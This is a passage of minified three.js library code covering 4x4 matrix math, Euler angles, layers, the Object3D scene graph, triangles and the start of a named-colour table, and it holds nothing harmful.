i=e.elements,s=n.elements,r=this.elements,a=i[0],o=i[4],l=i[8],c=i[12],p=i[1],d=i[5],h=i[9],f=i[13],v=i[2],y=i[6],m=i[10],u=i[14],g=i[3],_=i[7],b=i[11],T=i[15],A=s[0],C=s[4],L=s[8],w=s[12],E=s[1],P=s[5],G=s[9],V=s[13],Z=s[2],O=s[6],z=s[10],F=s[14],I=s[3],X=s[7],K=s[11],ne=s[15];return r[0]=a*A+o*E+l*Z+c*I,r[4]=a*C+o*P+l*O+c*X,r[8]=a*L+o*G+l*z+c*K,r[12]=a*w+o*V+l*F+c*ne,r[1]=p*A+d*E+h*Z+f*I,r[5]=p*C+d*P+h*O+f*X,r[9]=p*L+d*G+h*z+f*K,r[13]=p*w+d*V+h*F+f*ne,r[2]=v*A+y*E+m*Z+u*I,r[6]=v*C+y*P+m*O+u*X,r[10]=v*L+y*G+m*z+u*K,r[14]=v*w+y*V+m*F+u*ne,r[3]=g*A+_*E+b*Z+T*I,r[7]=g*C+_*P+b*O+T*X,r[11]=g*L+_*G+b*z+T*K,r[15]=g*w+_*V+b*F+T*ne,this}multiplyScalar(e){const n=this.elements;return n[0]*=e,n[4]*=e,n[8]*=e,n[12]*=e,n[1]*=e,n[5]*=e,n[9]*=e,n[13]*=e,n[2]*=e,n[6]*=e,n[10]*=e,n[14]*=e,n[3]*=e,n[7]*=e,n[11]*=e,n[15]*=e,this}determinant(){const e=this.elements,n=e[0],i=e[4],s=e[8],r=e[12],a=e[1],o=e[5],l=e[9],c=e[13],p=e[2],d=e[6],h=e[10],f=e[14],v=e[3],y=e[7],m=e[11],u=e[15],g=l*f-c*h,_=o*f-c*d,b=o*h-l*d,T=a*f-c*p,A=a*h-l*p,C=a*d-o*p;return n*(y*g-m*_+u*b)-i*(v*g-m*T+u*A)+s*(v*_-y*T+u*C)-r*(v*b-y*A+m*C)}transpose(){const e=this.elements;let n;return n=e[1],e[1]=e[4],e[4]=n,n=e[2],e[2]=e[8],e[8]=n,n=e[6],e[6]=e[9],e[9]=n,n=e[3],e[3]=e[12],e[12]=n,n=e[7],e[7]=e[13],e[13]=n,n=e[11],e[11]=e[14],e[14]=n,this}setPosition(e,n,i){const s=this.elements;return e.isVector3?(s[12]=e.x,s[13]=e.y,s[14]=e.z):(s[12]=e,s[13]=n,s[14]=i),this}invert(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],p=e[8],d=e[9],h=e[10],f=e[11],v=e[12],y=e[13],m=e[14],u=e[15],g=d*m*c-y*h*c+y*l*f-o*m*f-d*l*u+o*h*u,_=v*h*c-p*m*c-v*l*f+a*m*f+p*l*u-a*h*u,b=p*y*c-v*d*c+v*o*f-a*y*f-p*o*u+a*d*u,T=v*d*l-p*y*l-v*o*h+a*y*h+p*o*m-a*d*m,A=n*g+i*_+s*b+r*T;if(A===0)return this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);const C=1/A;return e[0]=g*C,e[1]=(y*h*r-d*m*r-y*s*f+i*m*f+d*s*u-i*h*u)*C,e[2]=(o*m*r-y*l*r+y*s*c-i*m*c-o*s*u+i*l*u)*C,e[3]=(d*l*r-o*h*r-d*s*c+i*h*c+o*s*f-i*l*f)*C,e[4]=_*C,e[5]=(p*m*r-v*h*r+v*s*f-n*m*f-p*s*u+n*h*u)*C,e[6]=(v*l*r-a*m*r-v*s*c+n*m*c+a*s*u-n*l*u)*C,e[7]=(a*h*r-p*l*r+p*s*c-n*h*c-a*s*f+n*l*f)*C,e[8]=b*C,e[9]=(v*d*r-p*y*r-v*i*f+n*y*f+p*i*u-n*d*u)*C,e[10]=(a*y*r-v*o*r+v*i*c-n*y*c-a*i*u+n*o*u)*C,e[11]=(p*o*r-a*d*r-p*i*c+n*d*c+a*i*f-n*o*f)*C,e[12]=T*C,e[13]=(p*y*s-v*d*s+v*i*h-n*y*h-p*i*m+n*d*m)*C,e[14]=(v*o*s-a*y*s-v*i*l+n*y*l+a*i*m-n*o*m)*C,e[15]=(a*d*s-p*o*s+p*i*l-n*d*l-a*i*h+n*o*h)*C,this}scale(e){const n=this.elements,i=e.x,s=e.y,r=e.z;return n[0]*=i,n[4]*=s,n[8]*=r,n[1]*=i,n[5]*=s,n[9]*=r,n[2]*=i,n[6]*=s,n[10]*=r,n[3]*=i,n[7]*=s,n[11]*=r,this}getMaxScaleOnAxis(){const e=this.elements,n=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],i=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],s=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(n,i,s))}makeTranslation(e,n,i){return e.isVector3?this.set(1,0,0,e.x,0,1,0,e.y,0,0,1,e.z,0,0,0,1):this.set(1,0,0,e,0,1,0,n,0,0,1,i,0,0,0,1),this}makeRotationX(e){const n=Math.cos(e),i=Math.sin(e);return this.set(1,0,0,0,0,n,-i,0,0,i,n,0,0,0,0,1),this}makeRotationY(e){const n=Math.cos(e),i=Math.sin(e);return this.set(n,0,i,0,0,1,0,0,-i,0,n,0,0,0,0,1),this}makeRotationZ(e){const n=Math.cos(e),i=Math.sin(e);return this.set(n,-i,0,0,i,n,0,0,0,0,1,0,0,0,0,1),this}makeRotationAxis(e,n){const i=Math.cos(n),s=Math.sin(n),r=1-i,a=e.x,o=e.y,l=e.z,c=r*a,p=r*o;return this.set(c*a+i,c*o-s*l,c*l+s*o,0,c*o+s*l,p*o+i,p*l-s*a,0,c*l-s*o,p*l+s*a,r*l*l+i,0,0,0,0,1),this}makeScale(e,n,i){return this.set(e,0,0,0,0,n,0,0,0,0,i,0,0,0,0,1),this}makeShear(e,n,i,s,r,a){return this.set(1,i,r,0,e,1,a,0,n,s,1,0,0,0,0,1),this}compose(e,n,i){const s=this.elements,r=n._x,a=n._y,o=n._z,l=n._w,c=r+r,p=a+a,d=o+o,h=r*c,f=r*p,v=r*d,y=a*p,m=a*d,u=o*d,g=l*c,_=l*p,b=l*d,T=i.x,A=i.y,C=i.z;return s[0]=(1-(y+u))*T,s[1]=(f+b)*T,s[2]=(v-_)*T,s[3]=0,s[4]=(f-b)*A,s[5]=(1-(h+u))*A,s[6]=(m+g)*A,s[7]=0,s[8]=(v+_)*C,s[9]=(m-g)*C,s[10]=(1-(h+y))*C,s[11]=0,s[12]=e.x,s[13]=e.y,s[14]=e.z,s[15]=1,this}decompose(e,n,i){const s=this.elements;if(e.x=s[12],e.y=s[13],e.z=s[14],this.determinant()===0)return i.set(1,1,1),n.identity(),this;let r=$s.set(s[0],s[1],s[2]).length();const a=$s.set(s[4],s[5],s[6]).length(),o=$s.set(s[8],s[9],s[10]).length();this.determinant()<0&&(r=-r),Fn.copy(this);const c=1/r,p=1/a,d=1/o;return Fn.elements[0]*=c,Fn.elements[1]*=c,Fn.elements[2]*=c,Fn.elements[4]*=p,Fn.elements[5]*=p,Fn.elements[6]*=p,Fn.elements[8]*=d,Fn.elements[9]*=d,Fn.elements[10]*=d,n.setFromRotationMatrix(Fn),i.x=r,i.y=a,i.z=o,this}makePerspective(e,n,i,s,r,a,o=ii,l=!1){const c=this.elements,p=2*r/(n-e),d=2*r/(i-s),h=(n+e)/(n-e),f=(i+s)/(i-s);let v,y;if(l)v=r/(a-r),y=a*r/(a-r);else if(o===ii)v=-(a+r)/(a-r),y=-2*a*r/(a-r);else if(o===Il)v=-a/(a-r),y=-a*r/(a-r);else throw new Error("THREE.Matrix4.makePerspective(): Invalid coordinate system: "+o);return c[0]=p,c[4]=0,c[8]=h,c[12]=0,c[1]=0,c[5]=d,c[9]=f,c[13]=0,c[2]=0,c[6]=0,c[10]=v,c[14]=y,c[3]=0,c[7]=0,c[11]=-1,c[15]=0,this}makeOrthographic(e,n,i,s,r,a,o=ii,l=!1){const c=this.elements,p=2/(n-e),d=2/(i-s),h=-(n+e)/(n-e),f=-(i+s)/(i-s);let v,y;if(l)v=1/(a-r),y=a/(a-r);else if(o===ii)v=-2/(a-r),y=-(a+r)/(a-r);else if(o===Il)v=-1/(a-r),y=-r/(a-r);else throw new Error("THREE.Matrix4.makeOrthographic(): Invalid coordinate system: "+o);return c[0]=p,c[4]=0,c[8]=0,c[12]=h,c[1]=0,c[5]=d,c[9]=0,c[13]=f,c[2]=0,c[6]=0,c[10]=v,c[14]=y,c[3]=0,c[7]=0,c[11]=0,c[15]=1,this}equals(e){const n=this.elements,i=e.elements;for(let s=0;s<16;s++)if(n[s]!==i[s])return!1;return!0}fromArray(e,n=0){for(let i=0;i<16;i++)this.elements[i]=e[i+n];return this}toArray(e=[],n=0){const i=this.elements;return e[n]=i[0],e[n+1]=i[1],e[n+2]=i[2],e[n+3]=i[3],e[n+4]=i[4],e[n+5]=i[5],e[n+6]=i[6],e[n+7]=i[7],e[n+8]=i[8],e[n+9]=i[9],e[n+10]=i[10],e[n+11]=i[11],e[n+12]=i[12],e[n+13]=i[13],e[n+14]=i[14],e[n+15]=i[15],e}}const $s=new H,Fn=new bt,bw=new H(0,0,0),ww=new H(1,1,1),Fi=new H,Po=new H,gn=new H,sm=new bt,rm=new eo;class ui{constructor(e=0,n=0,i=0,s=ui.DEFAULT_ORDER){this.isEuler=!0,this._x=e,this._y=n,this._z=i,this._order=s}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get order(){return this._order}set order(e){this._order=e,this._onChangeCallback()}set(e,n,i,s=this._order){return this._x=e,this._y=n,this._z=i,this._order=s,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._order)}copy(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this._onChangeCallback(),this}setFromRotationMatrix(e,n=this._order,i=!0){const s=e.elements,r=s[0],a=s[4],o=s[8],l=s[1],c=s[5],p=s[9],d=s[2],h=s[6],f=s[10];switch(n){case"XYZ":this._y=Math.asin(He(o,-1,1)),Math.abs(o)<.9999999?(this._x=Math.atan2(-p,f),this._z=Math.atan2(-a,r)):(this._x=Math.atan2(h,c),this._z=0);break;case"YXZ":this._x=Math.asin(-He(p,-1,1)),Math.abs(p)<.9999999?(this._y=Math.atan2(o,f),this._z=Math.atan2(l,c)):(this._y=Math.atan2(-d,r),this._z=0);break;case"ZXY":this._x=Math.asin(He(h,-1,1)),Math.abs(h)<.9999999?(this._y=Math.atan2(-d,f),this._z=Math.atan2(-a,c)):(this._y=0,this._z=Math.atan2(l,r));break;case"ZYX":this._y=Math.asin(-He(d,-1,1)),Math.abs(d)<.9999999?(this._x=Math.atan2(h,f),this._z=Math.atan2(l,r)):(this._x=0,this._z=Math.atan2(-a,c));break;case"YZX":this._z=Math.asin(He(l,-1,1)),Math.abs(l)<.9999999?(this._x=Math.atan2(-p,c),this._y=Math.atan2(-d,r)):(this._x=0,this._y=Math.atan2(o,f));break;case"XZY":this._z=Math.asin(-He(a,-1,1)),Math.abs(a)<.9999999?(this._x=Math.atan2(h,c),this._y=Math.atan2(o,r)):(this._x=Math.atan2(-p,f),this._y=0);break;default:Ie("Euler: .setFromRotationMatrix() encountered an unknown order: "+n)}return this._order=n,i===!0&&this._onChangeCallback(),this}setFromQuaternion(e,n,i){return sm.makeRotationFromQuaternion(e),this.setFromRotationMatrix(sm,n,i)}setFromVector3(e,n=this._order){return this.set(e.x,e.y,e.z,n)}reorder(e){return rm.setFromEuler(this),this.setFromQuaternion(rm,e)}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order}fromArray(e){return this._x=e[0],this._y=e[1],this._z=e[2],e[3]!==void 0&&(this._order=e[3]),this._onChangeCallback(),this}toArray(e=[],n=0){return e[n]=this._x,e[n+1]=this._y,e[n+2]=this._z,e[n+3]=this._order,e}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._order}}ui.DEFAULT_ORDER="XYZ";class V0{constructor(){this.mask=1}set(e){this.mask=(1<<e|0)>>>0}enable(e){this.mask|=1<<e|0}enableAll(){this.mask=-1}toggle(e){this.mask^=1<<e|0}disable(e){this.mask&=~(1<<e|0)}disableAll(){this.mask=0}test(e){return(this.mask&e.mask)!==0}isEnabled(e){return(this.mask&(1<<e|0))!==0}}let Ew=0;const am=new H,Ks=new eo,mi=new bt,ko=new H,ta=new H,Mw=new H,Tw=new eo,om=new H(1,0,0),lm=new H(0,1,0),cm=new H(0,0,1),um={type:"added"},Aw={type:"removed"},Zs={type:"childadded",child:null},qc={type:"childremoved",child:null};class $t extends Vr{constructor(){super(),this.isObject3D=!0,Object.defineProperty(this,"id",{value:Ew++}),this.uuid=Qa(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=$t.DEFAULT_UP.clone();const e=new H,n=new ui,i=new eo,s=new H(1,1,1);function r(){i.setFromEuler(n,!1)}function a(){n.setFromQuaternion(i,void 0,!1)}n._onChange(r),i._onChange(a),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:e},rotation:{configurable:!0,enumerable:!0,value:n},quaternion:{configurable:!0,enumerable:!0,value:i},scale:{configurable:!0,enumerable:!0,value:s},modelViewMatrix:{value:new bt},normalMatrix:{value:new Ue}}),this.matrix=new bt,this.matrixWorld=new bt,this.matrixAutoUpdate=$t.DEFAULT_MATRIX_AUTO_UPDATE,this.matrixWorldAutoUpdate=$t.DEFAULT_MATRIX_WORLD_AUTO_UPDATE,this.matrixWorldNeedsUpdate=!1,this.layers=new V0,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.animations=[],this.customDepthMaterial=void 0,this.customDistanceMaterial=void 0,this.userData={}}onBeforeShadow(){}onAfterShadow(){}onBeforeRender(){}onAfterRender(){}applyMatrix4(e){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(e),this.matrix.decompose(this.position,this.quaternion,this.scale)}applyQuaternion(e){return this.quaternion.premultiply(e),this}setRotationFromAxisAngle(e,n){this.quaternion.setFromAxisAngle(e,n)}setRotationFromEuler(e){this.quaternion.setFromEuler(e,!0)}setRotationFromMatrix(e){this.quaternion.setFromRotationMatrix(e)}setRotationFromQuaternion(e){this.quaternion.copy(e)}rotateOnAxis(e,n){return Ks.setFromAxisAngle(e,n),this.quaternion.multiply(Ks),this}rotateOnWorldAxis(e,n){return Ks.setFromAxisAngle(e,n),this.quaternion.premultiply(Ks),this}rotateX(e){return this.rotateOnAxis(om,e)}rotateY(e){return this.rotateOnAxis(lm,e)}rotateZ(e){return this.rotateOnAxis(cm,e)}translateOnAxis(e,n){return am.copy(e).applyQuaternion(this.quaternion),this.position.add(am.multiplyScalar(n)),this}translateX(e){return this.translateOnAxis(om,e)}translateY(e){return this.translateOnAxis(lm,e)}translateZ(e){return this.translateOnAxis(cm,e)}localToWorld(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(this.matrixWorld)}worldToLocal(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(mi.copy(this.matrixWorld).invert())}lookAt(e,n,i){e.isVector3?ko.copy(e):ko.set(e,n,i);const s=this.parent;this.updateWorldMatrix(!0,!1),ta.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?mi.lookAt(ta,ko,this.up):mi.lookAt(ko,ta,this.up),this.quaternion.setFromRotationMatrix(mi),s&&(mi.extractRotation(s.matrixWorld),Ks.setFromRotationMatrix(mi),this.quaternion.premultiply(Ks.invert()))}add(e){if(arguments.length>1){for(let n=0;n<arguments.length;n++)this.add(arguments[n]);return this}return e===this?($e("Object3D.add: object can't be added as a child of itself.",e),this):(e&&e.isObject3D?(e.removeFromParent(),e.parent=this,this.children.push(e),e.dispatchEvent(um),Zs.child=e,this.dispatchEvent(Zs),Zs.child=null):$e("Object3D.add: object not an instance of THREE.Object3D.",e),this)}remove(e){if(arguments.length>1){for(let i=0;i<arguments.length;i++)this.remove(arguments[i]);return this}const n=this.children.indexOf(e);return n!==-1&&(e.parent=null,this.children.splice(n,1),e.dispatchEvent(Aw),qc.child=e,this.dispatchEvent(qc),qc.child=null),this}removeFromParent(){const e=this.parent;return e!==null&&e.remove(this),this}clear(){return this.remove(...this.children)}attach(e){return this.updateWorldMatrix(!0,!1),mi.copy(this.matrixWorld).invert(),e.parent!==null&&(e.parent.updateWorldMatrix(!0,!1),mi.multiply(e.parent.matrixWorld)),e.applyMatrix4(mi),e.removeFromParent(),e.parent=this,this.children.push(e),e.updateWorldMatrix(!1,!0),e.dispatchEvent(um),Zs.child=e,this.dispatchEvent(Zs),Zs.child=null,this}getObjectById(e){return this.getObjectByProperty("id",e)}getObjectByName(e){return this.getObjectByProperty("name",e)}getObjectByProperty(e,n){if(this[e]===n)return this;for(let i=0,s=this.children.length;i<s;i++){const a=this.children[i].getObjectByProperty(e,n);if(a!==void 0)return a}}getObjectsByProperty(e,n,i=[]){this[e]===n&&i.push(this);const s=this.children;for(let r=0,a=s.length;r<a;r++)s[r].getObjectsByProperty(e,n,i);return i}getWorldPosition(e){return this.updateWorldMatrix(!0,!1),e.setFromMatrixPosition(this.matrixWorld)}getWorldQuaternion(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ta,e,Mw),e}getWorldScale(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ta,Tw,e),e}getWorldDirection(e){this.updateWorldMatrix(!0,!1);const n=this.matrixWorld.elements;return e.set(n[8],n[9],n[10]).normalize()}raycast(){}traverse(e){e(this);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].traverse(e)}traverseVisible(e){if(this.visible===!1)return;e(this);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].traverseVisible(e)}traverseAncestors(e){const n=this.parent;n!==null&&(e(n),n.traverseAncestors(e))}updateMatrix(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0}updateMatrixWorld(e){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||e)&&(this.matrixWorldAutoUpdate===!0&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)),this.matrixWorldNeedsUpdate=!1,e=!0);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].updateMatrixWorld(e)}updateWorldMatrix(e,n){const i=this.parent;if(e===!0&&i!==null&&i.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),this.matrixWorldAutoUpdate===!0&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)),n===!0){const s=this.children;for(let r=0,a=s.length;r<a;r++)s[r].updateWorldMatrix(!1,!0)}}toJSON(e){const n=e===void 0||typeof e=="string",i={};n&&(e={geometries:{},materials:{},textures:{},images:{},shapes:{},skeletons:{},animations:{},nodes:{}},i.metadata={version:4.7,type:"Object",generator:"Object3D.toJSON"});const s={};s.uuid=this.uuid,s.type=this.type,this.name!==""&&(s.name=this.name),this.castShadow===!0&&(s.castShadow=!0),this.receiveShadow===!0&&(s.receiveShadow=!0),this.visible===!1&&(s.visible=!1),this.frustumCulled===!1&&(s.frustumCulled=!1),this.renderOrder!==0&&(s.renderOrder=this.renderOrder),Object.keys(this.userData).length>0&&(s.userData=this.userData),s.layers=this.layers.mask,s.matrix=this.matrix.toArray(),s.up=this.up.toArray(),this.matrixAutoUpdate===!1&&(s.matrixAutoUpdate=!1),this.isInstancedMesh&&(s.type="InstancedMesh",s.count=this.count,s.instanceMatrix=this.instanceMatrix.toJSON(),this.instanceColor!==null&&(s.instanceColor=this.instanceColor.toJSON())),this.isBatchedMesh&&(s.type="BatchedMesh",s.perObjectFrustumCulled=this.perObjectFrustumCulled,s.sortObjects=this.sortObjects,s.drawRanges=this._drawRanges,s.reservedRanges=this._reservedRanges,s.geometryInfo=this._geometryInfo.map(o=>({...o,boundingBox:o.boundingBox?o.boundingBox.toJSON():void 0,boundingSphere:o.boundingSphere?o.boundingSphere.toJSON():void 0})),s.instanceInfo=this._instanceInfo.map(o=>({...o})),s.availableInstanceIds=this._availableInstanceIds.slice(),s.availableGeometryIds=this._availableGeometryIds.slice(),s.nextIndexStart=this._nextIndexStart,s.nextVertexStart=this._nextVertexStart,s.geometryCount=this._geometryCount,s.maxInstanceCount=this._maxInstanceCount,s.maxVertexCount=this._maxVertexCount,s.maxIndexCount=this._maxIndexCount,s.geometryInitialized=this._geometryInitialized,s.matricesTexture=this._matricesTexture.toJSON(e),s.indirectTexture=this._indirectTexture.toJSON(e),this._colorsTexture!==null&&(s.colorsTexture=this._colorsTexture.toJSON(e)),this.boundingSphere!==null&&(s.boundingSphere=this.boundingSphere.toJSON()),this.boundingBox!==null&&(s.boundingBox=this.boundingBox.toJSON()));function r(o,l){return o[l.uuid]===void 0&&(o[l.uuid]=l.toJSON(e)),l.uuid}if(this.isScene)this.background&&(this.background.isColor?s.background=this.background.toJSON():this.background.isTexture&&(s.background=this.background.toJSON(e).uuid)),this.environment&&this.environment.isTexture&&this.environment.isRenderTargetTexture!==!0&&(s.environment=this.environment.toJSON(e).uuid);else if(this.isMesh||this.isLine||this.isPoints){s.geometry=r(e.geometries,this.geometry);const o=this.geometry.parameters;if(o!==void 0&&o.shapes!==void 0){const l=o.shapes;if(Array.isArray(l))for(let c=0,p=l.length;c<p;c++){const d=l[c];r(e.shapes,d)}else r(e.shapes,l)}}if(this.isSkinnedMesh&&(s.bindMode=this.bindMode,s.bindMatrix=this.bindMatrix.toArray(),this.skeleton!==void 0&&(r(e.skeletons,this.skeleton),s.skeleton=this.skeleton.uuid)),this.material!==void 0)if(Array.isArray(this.material)){const o=[];for(let l=0,c=this.material.length;l<c;l++)o.push(r(e.materials,this.material[l]));s.material=o}else s.material=r(e.materials,this.material);if(this.children.length>0){s.children=[];for(let o=0;o<this.children.length;o++)s.children.push(this.children[o].toJSON(e).object)}if(this.animations.length>0){s.animations=[];for(let o=0;o<this.animations.length;o++){const l=this.animations[o];s.animations.push(r(e.animations,l))}}if(n){const o=a(e.geometries),l=a(e.materials),c=a(e.textures),p=a(e.images),d=a(e.shapes),h=a(e.skeletons),f=a(e.animations),v=a(e.nodes);o.length>0&&(i.geometries=o),l.length>0&&(i.materials=l),c.length>0&&(i.textures=c),p.length>0&&(i.images=p),d.length>0&&(i.shapes=d),h.length>0&&(i.skeletons=h),f.length>0&&(i.animations=f),v.length>0&&(i.nodes=v)}return i.object=s,i;function a(o){const l=[];for(const c in o){const p=o[c];delete p.metadata,l.push(p)}return l}}clone(e){return new this.constructor().copy(this,e)}copy(e,n=!0){if(this.name=e.name,this.up.copy(e.up),this.position.copy(e.position),this.rotation.order=e.rotation.order,this.quaternion.copy(e.quaternion),this.scale.copy(e.scale),this.matrix.copy(e.matrix),this.matrixWorld.copy(e.matrixWorld),this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrixWorldAutoUpdate=e.matrixWorldAutoUpdate,this.matrixWorldNeedsUpdate=e.matrixWorldNeedsUpdate,this.layers.mask=e.layers.mask,this.visible=e.visible,this.castShadow=e.castShadow,this.receiveShadow=e.receiveShadow,this.frustumCulled=e.frustumCulled,this.renderOrder=e.renderOrder,this.animations=e.animations.slice(),this.userData=JSON.parse(JSON.stringify(e.userData)),n===!0)for(let i=0;i<e.children.length;i++){const s=e.children[i];this.add(s.clone())}return this}}$t.DEFAULT_UP=new H(0,1,0);$t.DEFAULT_MATRIX_AUTO_UPDATE=!0;$t.DEFAULT_MATRIX_WORLD_AUTO_UPDATE=!0;const Bn=new H,gi=new H,Yc=new H,vi=new H,Js=new H,Qs=new H,dm=new H,$c=new H,Kc=new H,Zc=new H,Jc=new St,Qc=new St,eu=new St;class Gn{constructor(e=new H,n=new H,i=new H){this.a=e,this.b=n,this.c=i}static getNormal(e,n,i,s){s.subVectors(i,n),Bn.subVectors(e,n),s.cross(Bn);const r=s.lengthSq();return r>0?s.multiplyScalar(1/Math.sqrt(r)):s.set(0,0,0)}static getBarycoord(e,n,i,s,r){Bn.subVectors(s,n),gi.subVectors(i,n),Yc.subVectors(e,n);const a=Bn.dot(Bn),o=Bn.dot(gi),l=Bn.dot(Yc),c=gi.dot(gi),p=gi.dot(Yc),d=a*c-o*o;if(d===0)return r.set(0,0,0),null;const h=1/d,f=(c*l-o*p)*h,v=(a*p-o*l)*h;return r.set(1-f-v,v,f)}static containsPoint(e,n,i,s){return this.getBarycoord(e,n,i,s,vi)===null?!1:vi.x>=0&&vi.y>=0&&vi.x+vi.y<=1}static getInterpolation(e,n,i,s,r,a,o,l){return this.getBarycoord(e,n,i,s,vi)===null?(l.x=0,l.y=0,"z"in l&&(l.z=0),"w"in l&&(l.w=0),null):(l.setScalar(0),l.addScaledVector(r,vi.x),l.addScaledVector(a,vi.y),l.addScaledVector(o,vi.z),l)}static getInterpolatedAttribute(e,n,i,s,r,a){return Jc.setScalar(0),Qc.setScalar(0),eu.setScalar(0),Jc.fromBufferAttribute(e,n),Qc.fromBufferAttribute(e,i),eu.fromBufferAttribute(e,s),a.setScalar(0),a.addScaledVector(Jc,r.x),a.addScaledVector(Qc,r.y),a.addScaledVector(eu,r.z),a}static isFrontFacing(e,n,i,s){return Bn.subVectors(i,n),gi.subVectors(e,n),Bn.cross(gi).dot(s)<0}set(e,n,i){return this.a.copy(e),this.b.copy(n),this.c.copy(i),this}setFromPointsAndIndices(e,n,i,s){return this.a.copy(e[n]),this.b.copy(e[i]),this.c.copy(e[s]),this}setFromAttributeAndIndices(e,n,i,s){return this.a.fromBufferAttribute(e,n),this.b.fromBufferAttribute(e,i),this.c.fromBufferAttribute(e,s),this}clone(){return new this.constructor().copy(this)}copy(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this}getArea(){return Bn.subVectors(this.c,this.b),gi.subVectors(this.a,this.b),Bn.cross(gi).length()*.5}getMidpoint(e){return e.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)}getNormal(e){return Gn.getNormal(this.a,this.b,this.c,e)}getPlane(e){return e.setFromCoplanarPoints(this.a,this.b,this.c)}getBarycoord(e,n){return Gn.getBarycoord(e,this.a,this.b,this.c,n)}getInterpolation(e,n,i,s,r){return Gn.getInterpolation(e,this.a,this.b,this.c,n,i,s,r)}containsPoint(e){return Gn.containsPoint(e,this.a,this.b,this.c)}isFrontFacing(e){return Gn.isFrontFacing(this.a,this.b,this.c,e)}intersectsBox(e){return e.intersectsTriangle(this)}closestPointToPoint(e,n){const i=this.a,s=this.b,r=this.c;let a,o;Js.subVectors(s,i),Qs.subVectors(r,i),$c.subVectors(e,i);const l=Js.dot($c),c=Qs.dot($c);if(l<=0&&c<=0)return n.copy(i);Kc.subVectors(e,s);const p=Js.dot(Kc),d=Qs.dot(Kc);if(p>=0&&d<=p)return n.copy(s);const h=l*d-p*c;if(h<=0&&l>=0&&p<=0)return a=l/(l-p),n.copy(i).addScaledVector(Js,a);Zc.subVectors(e,r);const f=Js.dot(Zc),v=Qs.dot(Zc);if(v>=0&&f<=v)return n.copy(r);const y=f*c-l*v;if(y<=0&&c>=0&&v<=0)return o=c/(c-v),n.copy(i).addScaledVector(Qs,o);const m=p*v-f*d;if(m<=0&&d-p>=0&&f-v>=0)return dm.subVectors(r,s),o=(d-p)/(d-p+(f-v)),n.copy(s).addScaledVector(dm,o);const u=1/(m+y+h);return a=y*u,o=h*u,n.copy(i).addScaledVector(Js,a).addScaledVector(Qs,o)}equals(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)}}const H0={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:1